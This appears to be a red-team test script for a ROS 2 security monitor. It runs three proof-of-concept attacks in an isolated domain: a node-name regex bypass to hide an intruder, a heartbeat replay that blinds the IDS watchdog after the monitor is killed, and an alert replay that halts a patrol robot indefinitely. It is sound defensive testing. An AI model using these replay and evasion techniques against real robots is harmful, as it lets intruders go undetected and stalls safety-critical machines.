#!/usr/bin/env bash
# 跑 N1 / N2 / N3 三個威脅模型沒涵蓋的新攻擊。
# 全部用 ROS_DOMAIN_ID=99 隔離。

set +u
DOMAIN_ID=99
ROS2_WS=$HOME/ros2_ws
RT=$ROS2_WS/紅隊測試/PoC腳本   # PoC .py 已歸入 PoC腳本/ 子資料夾
LOG=/tmp/N_attacks
mkdir -p $LOG

# 不汙染真環境
unset ROS_SECURITY_ENABLE ROS_SECURITY_STRATEGY ROS_SECURITY_KEYSTORE
unset ROS_SECURITY_ENCLAVE_OVERRIDE LINE_CHANNEL_TOKEN LINE_USER_ID
source /opt/ros/jazzy/setup.bash
source $ROS2_WS/install/setup.bash
export ROS_DOMAIN_ID=$DOMAIN_ID

banner() {
    echo
    echo "════════════════════════════════════════════════════════════════"
    echo "  $1"
    echo "════════════════════════════════════════════════════════════════"
}

cleanup() {
    pkill -9 -f "monitor_node" 2>/dev/null
    pkill -9 -f "intelligent_defense_node" 2>/dev/null
    pkill -9 -f "patrol_node" 2>/dev/null
    pkill -9 -f "demo_nodes_py" 2>/dev/null
    pkill -9 -f "N1_heartbeat_replay" 2>/dev/null
    pkill -9 -f "N2_ros2cli_regex_bypass" 2>/dev/null
    pkill -9 -f "N3_alert_replay_dos" 2>/dev/null
    pkill -9 -f "attacker_" 2>/dev/null
    sleep 1
}
trap cleanup EXIT

# ============================================================
# N2 — _ros2cli_ 正則後門（最簡單，先跑）
# ============================================================
attack_N2() {
    banner "攻擊 N2 — _INTERNAL_NODE_REGEX 後門（偽裝成 _ros2cli_*）"
    echo "  威脅模型聲稱 G1 已修補：移除 _ prefix 全放行 → 改為嚴格正則"
    echo "  漏洞：正則本身就是後門 — 攻擊者命名 _ros2cli_evil_999_deadbeef 直接通過"
    cleanup
    > $LOG/N2_monitor.log
    > $LOG/N2_attacker.log

    ros2 run dds_security_monitor monitor_node \
        --ros-args -p poll_interval_sec:=1.5 -p emergency_stop_enabled:=false \
        > $LOG/N2_monitor.log 2>&1 &
    MON=$!
    sleep 4
    echo "  monitor 啟動完成。發動攻擊..."

    python3 $RT/N2_ros2cli_regex_bypass.py _ros2cli_evil_99999_deadbeefcafe 8 \
        > $LOG/N2_attacker.log 2>&1 &
    sleep 10
    kill $MON 2>/dev/null
    wait 2>/dev/null

    echo
    echo "  攻擊者輸出（節錄）："
    grep -E '偽裝|存活' $LOG/N2_attacker.log | head -3 | sed 's/^/    /'
    echo
    echo "  monitor 偵測結果："
    if grep -q '_ros2cli_evil' $LOG/N2_monitor.log; then
        echo "    ✓ 已偵測到（攻擊失敗）"
        grep -E '未知節點|_ros2cli_evil' $LOG/N2_monitor.log | head -3 | sed 's/^/      /'
    else
        echo "    ✗✗✗ monitor 從未發過 alert（攻擊成功 — 隱身入侵）"
        echo "    （monitor 把 _ros2cli_evil_99999_deadbeefcafe 當成 ros2 CLI 內部節點）"
    fi
}

# ============================================================
# N1 — heartbeat replay（騙過 IDS D5 watchdog）
# ============================================================
attack_N1() {
    banner "攻擊 N1 — /security/heartbeat replay（殺 monitor 但 IDS 不察覺）"
    echo "  威脅模型 G6 修補：「kill monitor 會被 IDS 抓到」"
    echo "  漏洞：心跳 HMAC 沒包 nonce/timestamp → 攻擊者錄一筆無限重放"
    cleanup
    > $LOG/N1_monitor.log
    > $LOG/N1_ids.log
    > $LOG/N1_attacker.log

    ros2 run dds_security_monitor monitor_node \
        --ros-args -p emergency_stop_enabled:=false \
        > $LOG/N1_monitor.log 2>&1 &
    MON=$!
    ros2 run dds_security_monitor intelligent_defense_node \
        > $LOG/N1_ids.log 2>&1 &
    IDS=$!
    sleep 5

    echo "  monitor + IDS 啟動完成。發動 replay 攻擊..."
    python3 $RT/N1_heartbeat_replay.py 25 > $LOG/N1_attacker.log 2>&1 &
    AT=$!
    sleep 4

    echo "  錄到心跳後立刻 kill monitor（攻擊者已準備好替它送心跳）"
    pkill -9 -f "monitor_node" 2>/dev/null  # 用 pkill 才能殺到 Python child

    # 等 15s 觀察 IDS 反應（D5 timeout=10s，正常會 fire；replay 成功則永不 fire）
    sleep 15
    kill $IDS $AT 2>/dev/null
    wait 2>/dev/null

    echo
    echo "  攻擊者輸出："
    grep -E '已捕獲|REPLAY|重放' $LOG/N1_attacker.log | head -5 | sed 's/^/    /'
    echo
    echo "  IDS 反應："
    D5_HITS=$(grep -c 'monitor 心跳已' $LOG/N1_ids.log)
    echo "    D5 (heartbeat watchdog) alert 次數: $D5_HITS"
    if [ "$D5_HITS" = "0" ]; then
        echo "    ✗✗✗ 攻擊成功 — IDS 完全沒察覺 monitor 已死"
        echo "    （攻擊者用 replay 持續餵假心跳，watchdog 一直被刷新）"
    else
        echo "    ✓ IDS 抓到了"
        grep 'monitor 心跳已' $LOG/N1_ids.log | head -2 | sed 's/^/      /'
    fi
    # 顯示 IDS 印的統計
    echo
    echo "  IDS 統計（最後一筆）："
    grep 'status:' $LOG/N1_ids.log | tail -1 | sed 's/^/    /'
}

# ============================================================
# N3 — /security/alerts replay → 永久 patrol DoS
# ============================================================
attack_N3() {
    banner "攻擊 N3 — /security/alerts replay（永久 patrol DoS，不需 secret）"
    echo "  威脅模型 B 修補：「HMAC 簽章 → 偽造被擋」"
    echo "  漏洞：sign_alert 沒包 nonce/timestamp → 合法 alert 的 bytes 可重放"
    echo "  攻擊：每 5s 重放一次 → patrol 的 30s resume timer 一直被重置 → 永久停車"
    cleanup
    > $LOG/N3_monitor.log
    > $LOG/N3_patrol.log
    > $LOG/N3_attacker.log

    ros2 run dds_security_monitor monitor_node \
        --ros-args -p poll_interval_sec:=1.5 -p emergency_stop_enabled:=false \
        > $LOG/N3_monitor.log 2>&1 &
    MON=$!
    ros2 run dds_security_monitor patrol_node \
        > $LOG/N3_patrol.log 2>&1 &
    PAT=$!
    sleep 5

    echo "  monitor + patrol 啟動完成。啟動 replayer（先監聽）..."
    python3 $RT/N3_alert_replay_dos.py 45 > $LOG/N3_attacker.log 2>&1 &
    AT=$!
    sleep 2

    echo "  觸發一筆合法 alert（短暫啟動非白名單節點）..."
    ros2 run demo_nodes_py listener \
        --ros-args --remap __node:=trigger_node_for_replay \
        > /dev/null 2>&1 &
    TRIG=$!
    sleep 5
    kill $TRIG 2>/dev/null

    echo "  alert 已觸發。等攻擊者捕獲 + 開始重放..."
    sleep 3

    echo "  kill 真 monitor（不再有新 alert）..."
    pkill -9 -f "monitor_node" 2>/dev/null  # 用 pkill 才能殺到 Python child

    # patrol 沒收到新合法 alert，正常情況 30s 後 resume
    # 但攻擊者每 5s replay → resume timer 一直被重置 → 永遠不 resume
    echo "  等 35 秒觀察 patrol 是否 resume（正常會在 30s 後 resume）..."
    sleep 35

    kill $PAT $AT 2>/dev/null
    wait 2>/dev/null

    echo
    echo "  攻擊者輸出："
    grep -E '捕獲|重放|REPLAY' $LOG/N3_attacker.log | head -5 | sed 's/^/    /'
    REPLAY_N=$(grep -c '重放 #' $LOG/N3_attacker.log)
    echo "    重放總次數: $REPLAY_N"
    echo
    echo "  patrol 反應："
    PAUSE_N=$(grep -c '安全警報' $LOG/N3_patrol.log)
    RESUME_N=$(grep -c '安全暫停解除' $LOG/N3_patrol.log)
    REJECT_N=$(grep -c '未簽章或偽造' $LOG/N3_patrol.log)
    echo "    收到合法 alert（含 replay）次數: $PAUSE_N"
    echo "    拒絕未簽章訊息次數:                $REJECT_N"
    echo "    安全暫停解除次數:                  $RESUME_N"
    if [ "$RESUME_N" = "0" ] && [ "$PAUSE_N" -gt 2 ]; then
        echo "    ✗✗✗ 攻擊成功 — patrol 永久停車（resume timer 一直被重置）"
        echo "    （HMAC 驗章通過，因為簽章本身合法，只是「重放的」）"
    elif [ "$RESUME_N" -gt 0 ]; then
        echo "    ✓ patrol 在某個時間點 resume 了 → 攻擊失敗"
    else
        echo "    ? 結果不明確（看 log 細節）"
    fi
}

case "${1:-all}" in
    N1) attack_N1 ;;
    N2) attack_N2 ;;
    N3) attack_N3 ;;
    all)
        attack_N2
        attack_N1
        attack_N3
        banner "全部 3 個新攻擊完成 — 結果寫入 $LOG/"
        ;;
    *) echo "用法: $0 [N1|N2|N3|all]"; exit 1 ;;
esac
